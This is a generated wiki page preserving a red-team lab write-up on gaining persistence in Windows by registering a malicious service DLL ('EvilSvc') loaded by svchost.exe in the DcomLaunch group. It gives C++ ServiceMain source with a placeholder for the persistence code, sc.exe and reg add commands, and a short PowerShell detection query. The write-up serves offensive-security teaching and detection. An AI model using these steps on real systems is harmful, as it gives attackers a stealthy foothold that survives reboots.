---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# Persisting in svchost.exe with a Service DLL

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-persistence-persisting-in-svchost.exe-with-a-service-dll-servicemain` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/persistence/persisting-in-svchost.exe-with-a-service-dll-servicemain.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Persisting in svchost.exe with a Service DLL](../../topics/offensive-security/persisting-in-svchost.exe-with-a-service-dll.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-offensive-security-persistence-persisting-in-svchost.exe-with-a-service-dll-servicemain |
| name | Persisting in svchost.exe with a Service DLL |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security/persistence/persisting-in-svchost.exe-with-a-service-dll-servicemain.md |

## Preserved Source Material

````yaml
_asset_filenames:
- image (626).png
- image (628).png
- image (630).png
- image (631).png
_body: "# Persisting in svchost.exe with a Service DLL\n\nThis is a quick lab that looks into a persistence mechanism that\
  \ relies on installing a new Windows service, that will be hosted by an svchost.exe process.\n\n## Overview\n\nAt a high\
  \ level, this is how the technique works:\n\n1. Create a service `EvilSvc.dll` DLL (the DLL that will be loaded into an\
  \ `svchost.exe`) with the code we want executed on each system reboot\n2. Create a new service `EvilSvc` with `binPath=\
  \ svchost.exe`\n3. Add the `ServiceDll` value to `EvilSvc` service and point it to the service DLL compiled in step 1\n\
  4. Modify `HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost` to specify under which group your service should\
  \ be loaded into\n5. Start `EvilSvc` service\n6. The `EvilSvc` is started and its service DLL `EvilSvc.dll` is loaded into\
  \ an `svchost.exe`\n\n## Walkthrough\n\n### 1. Compile Service DLL\n\nFirst of, let's compile our service DLL as EvilSvc.dll.\
  \ This DLL is going to be loaded into an `svchost.exe` as part of our service `EvilSvc` that we will register in a second:\n\
  \n```cpp\n#include \"pch.h\"\n#define SVCNAME TEXT(\"EvilSvc\")\n\nSERVICE_STATUS serviceStatus;\nSERVICE_STATUS_HANDLE\
  \ serviceStatusHandle;\nHANDLE stopEvent = NULL;\n\nVOID UpdateServiceStatus(DWORD currentState)\n{\n    serviceStatus.dwCurrentState\
  \ = currentState;\n    SetServiceStatus(serviceStatusHandle, &serviceStatus);\n}\n\nDWORD ServiceHandler(DWORD controlCode,\
  \ DWORD eventType, LPVOID eventData, LPVOID context)\n{\n    switch (controlCode)\n    {\n        case SERVICE_CONTROL_STOP:\n\
  \            serviceStatus.dwCurrentState = SERVICE_STOPPED;\n            SetEvent(stopEvent);\n            break;\n   \
  \     case SERVICE_CONTROL_SHUTDOWN:\n            serviceStatus.dwCurrentState = SERVICE_STOPPED;\n            SetEvent(stopEvent);\n\
  \            break;\n        case SERVICE_CONTROL_PAUSE:\n            serviceStatus.dwCurrentState = SERVICE_PAUSED;\n \
  \           break;\n        case SERVICE_CONTROL_CONTINUE:\n            serviceStatus.dwCurrentState = SERVICE_RUNNING;\n\
  \            break;\n        case SERVICE_CONTROL_INTERROGATE:\n            break;\n        default:\n            break;\n\
  \    }\n\n    UpdateServiceStatus(SERVICE_RUNNING);\n\n    return NO_ERROR;\n}\n\nVOID ExecuteServiceCode()\n{\n    stopEvent\
  \ = CreateEvent(NULL, TRUE, FALSE, NULL);\n    UpdateServiceStatus(SERVICE_RUNNING);\n\n    // #####################################\n\
  \    // your persistence code here\n    // #####################################\n\n    while (1)\n    {\n        WaitForSingleObject(stopEvent,\
  \ INFINITE);\n        UpdateServiceStatus(SERVICE_STOPPED);\n        return;\n    }\n}\n\nextern \"C\" __declspec(dllexport)\
  \ VOID WINAPI ServiceMain(DWORD argC, LPWSTR * argV)\n{\n    serviceStatusHandle = RegisterServiceCtrlHandler(SVCNAME, (LPHANDLER_FUNCTION)ServiceHandler);\n\
  \n    serviceStatus.dwServiceType = SERVICE_WIN32_SHARE_PROCESS;\n    serviceStatus.dwServiceSpecificExitCode = 0;\n\n \
  \   UpdateServiceStatus(SERVICE_START_PENDING);\n    ExecuteServiceCode();\n}\n```\n\n### 2. Create EvilSvc Service\n\n\
  Let's now create a new service called `EvilSvc` and specify the `binPath` to be `svchost.exe -k DcomLaunch`, which will\
  \ tell Service Control Manager that we want our `EvilSvc` to be hosted by `svchost.exe` in a service group called `DcomLaunch`:\n\
  \n```\nsc.exe create EvilSvc binPath= \"c:\\windows\\System32\\svchost.exe -k DcomLaunch\" type= share start= auto\n```\n\
  \n### 3. Modify EvilSvc - Specify ServiceDLL Path\n\nNext, inside `HKLM\\SYSTEM\\CurrentControlSet\\services\\EvilSvc\\\
  `, create a new value called `ServiceDll` and point it to the EvilSvc.dll service DLL compiled in step 1:\n\n```\nreg add\
  \ HKLM\\SYSTEM\\CurrentControlSet\\services\\EvilSvc\\Parameters /v ServiceDll /t REG_EXPAND_SZ /d C:\\Windows\\system32\\\
  EvilSvc.dll /f\n```\n\n{% hint style=\"warning\" %}\n`EvilSvc.dll` must exist in `C:\\Windows\\system32\\EvilSvc.dll`\n\
  {% endhint %}\n\nAt this point, our `EvilSvc` should be created with all the right parameters as seen in the registry:\n\
  \n![](<../../.gitbook/assets/image (628).png>)\n\n### 4. Group EvilSvc with DcomLaunch\n\nAs a final step, we need to tell\
  \ the Service Control Manager under which service group our `EvilSvc`should load.&#x20;\n\nWe want it to get loaded in the\
  \ `DcomLaunch` group, so we need to add our service name `EvilSvc` in the list of services in the `DcomLaunch` value in\
  \ `HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost`:\n\n![](<../../.gitbook/assets/image (626).png>)\n\n\
  ### 5. Start EvilSvc Service\n\nWe can now try loading our `EvilSvc` service:\n\n```\nsc.exe start EvilSvc\n```\n\n`EvilSvc`\
  \ is now loaded into svchost.exe as part of a `DcomLauncher` services group:\n\n![](<../../.gitbook/assets/image (630).png>)\n\
  \n## Detection\n\nBelow are some initial thoughts on how one could start hunting for this technique:\n\n* Recently created\
  \ services with `svchost.exe` as a `binpath`\n* Listing out ServiceDLL value for all system services and looking for DLLs\
  \ that are loaded from suspicious locations (i.e non c:\\windows\\system32):\\\n  `Get-ItemProperty hklm:\\SYSTEM\\ControlSet001\\\
  Services\\*\\Parameters | ? { $_.servicedll } | select psparentpath, servicedll`\n\n![EvilSvc.dll location sticking out](<../../.gitbook/assets/image\
  \ (631).png>)\n\n## References\n\n{% embed url=\"https://docs.microsoft.com/en-us/windows/win32/services/writing-a-servicemain-function\"\
  \ %}"
_relative_path: offensive-security/persistence/persisting-in-svchost.exe-with-a-service-dll-servicemain.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/persistence/persisting-in-svchost.exe-with-a-service-dll-servicemain.md
````
